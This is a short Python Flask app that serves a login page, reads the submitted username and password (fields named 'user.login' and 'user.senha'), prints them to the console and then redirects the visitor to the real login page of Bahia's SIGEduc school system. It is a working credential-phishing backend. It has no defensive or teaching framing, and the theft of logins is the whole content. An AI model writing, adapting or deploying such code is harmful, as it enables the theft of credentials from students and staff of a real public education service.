from flask import Flask,render_template,request, url_for ,redirect

app = Flask(__name__)

@app.route("/",methods=["GET","POST"])
def home():
    if request.method == "POST":
        usuario = request.form.get("user.login")
        senha = request.form.get("user.senha")

        print("------------------------------")
        print(f"Usuario: {usuario}")
        print(f"Senha: {senha}")
        print("------------------------------")
        return redirect("https://sigeduc.educacao.ba.gov.br/sigeduc/logar.do?dispatch=logOn")
    return render_template("index.html")
    
if __name__ == "__main__":
    app.run(debug=True)    